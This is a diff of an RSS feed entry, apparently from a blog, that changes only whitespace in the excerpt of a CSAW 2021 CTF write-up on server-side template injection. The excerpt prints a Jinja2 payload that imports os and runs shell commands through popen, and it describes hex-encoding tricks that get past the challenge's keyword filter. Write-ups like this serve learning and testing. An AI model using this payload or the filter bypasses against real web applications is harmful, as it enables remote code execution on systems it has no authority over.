@@ -12,10 +12,10 @@
         <pubDate>Tue, 14 Sep 2021 13:13:43 +0700</pubDate>
         
         <guid>/posts/csaw/</guid>
-        <description>Ninja Type: SSTI I test value param with {{7*7}} and it returns 49.
-http://web.chal.csaw.io:5000/submit?value={{7*7}} RCE steps {{request.application.__globals__.__builtins__.__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;ls -la&amp;#39;).read()}} This payload import class os and executes ls -la from popen. Send this payload and we get the response:
+        <description>Ninja  Type: SSTI  I test value param with {{7*7}} and it returns 49.
+http://web.chal.csaw.io:5000/submit?value={{7*7}}  RCE steps {{request.application.__globals__.__builtins__.__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;ls -la&amp;#39;).read()}} This payload import class os and executes ls -la from popen. Send this payload and we get the response:
 Sorry, the following keywords/characters are not allowed :- _ ,config ,os, RUNCMD, base It&amp;rsquo;s not hard to bypass this filters
-With _ we can bypass by \x5f (hex encode) With os we can bypass by \x6f\x73 With .</description>
+ With _ we can bypass by \x5f (hex encode) With os we can bypass by \x6f\x73 With .</description>
       </item>
     
   </channel>
